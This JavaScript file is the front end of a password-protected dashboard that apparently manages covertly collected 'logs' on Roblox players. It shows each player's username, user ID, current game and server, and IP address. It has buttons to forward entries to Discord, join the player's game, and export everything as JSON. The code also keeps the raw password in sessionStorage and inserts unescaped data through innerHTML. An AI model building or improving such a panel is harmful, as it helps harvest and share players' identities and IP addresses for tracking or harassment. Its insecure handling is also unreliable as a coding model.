const authToken = sessionStorage.getItem("auth");

if (authToken) {
  document.getElementById("login").classList.add("hidden");
  document.getElementById("dashboard").classList.remove("hidden");
  fetchLogs();
}

function auth() {
  const password = document.getElementById("password").value;
  fetch("/auth", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ password })
  })
    .then(res => res.json())
    .then(data => {
      if (data.message === "Authorized") {
        sessionStorage.setItem("auth", password);
        document.getElementById("login").classList.add("hidden");
        document.getElementById("dashboard").classList.remove("hidden");
        fetchLogs();
      }
    });
}

function fetchLogs() {
  fetch("/logs", {
    headers: {
      Authorization: "Bearer " + sessionStorage.getItem("auth")
    }
  })
    .then(res => res.json())
    .then(data => {
      const container = document.getElementById("logs-container");
      container.innerHTML = "";

      const grouped = {};
      data.forEach(log => {
        if (!grouped[log.username]) grouped[log.username] = [];
        grouped[log.username].push(log);
      });

      Object.entries(grouped).forEach(([username, logs]) => {
        const card = document.createElement("div");
        card.className = "log-card";

        const first = logs[0];

        const details = logs.map(l => `
          <div class="log-entry">
            <p><strong>Display Name:</strong> ${l.displayname}</p>
            <p><strong>User ID:</strong> ${l.userid}</p>
            <p><strong>Game:</strong> ${l.game}</p>
            <p><strong>Place ID:</strong> ${l.placeid}</p>
            <p><strong>Job ID:</strong> ${l.jobid}</p>
            <p><strong>IP:</strong> ${l.ip}</p>
            <hr>
          </div>
        `).join("");

        card.innerHTML = `
          <img src="${first.thumbnail}" class="thumbnail" />
          <div class="log-info">
            <h2>${username}</h2>
            <div class="actions">
              <a href="https://www.roblox.com/users/${first.userid}/profile" target="_blank">Profile</a>
              <a href="https://www.roblox.com/games/${first.placeid}/" target="_blank">Join Game</a>
              <button onclick="resendLog('${first.userid}')">Resend to Discord</button>
              <button onclick="deleteLog('${first.userid}')">Delete</button>
              <button onclick='downloadUser(${JSON.stringify(logs)})'>Download JSON</button>
              <button onclick="toggleLogs(this)">View Logs</button>
            </div>
            <div class="log-details hidden">${details}</div>
          </div>
        `;

        container.appendChild(card);
      });
    });
}

function resendLog(userid) {
  fetch("/send_log/" + userid, {
    method: "POST",
    headers: {
      Authorization: "Bearer " + sessionStorage.getItem("auth")
    }
  }).then(() => fetchLogs());
}

function deleteLog(userid) {
  fetch("/logs/" + userid, {
    method: "DELETE",
    headers: {
      Authorization: "Bearer " + sessionStorage.getItem("auth")
    }
  }).then(() => fetchLogs());
}

function downloadUser(logs) {
  const blob = new Blob([JSON.stringify(logs, null, 2)], { type: "application/json" });
  const url = URL.createObjectURL(blob);
  const a = document.createElement("a");
  a.href = url;
  a.download = logs[0].username + "_logs.json";
  a.click();
  URL.revokeObjectURL(url);
}

function downloadAll() {
  fetch("/logs", {
    headers: {
      Authorization: "Bearer " + sessionStorage.getItem("auth")
    }
  })
    .then(res => res.json())
    .then(data => {
      const blob = new Blob([JSON.stringify(data, null, 2)], { type: "application/json" });
      const url = URL.createObjectURL(blob);
      const a = document.createElement("a");
      a.href = url;
      a.download = "all_logs.json";
      a.click();
      URL.revokeObjectURL(url);
    });
}

function toggleLogs(btn) {
  const details = btn.parentNode.nextElementSibling;
  details.classList.toggle("hidden");
}
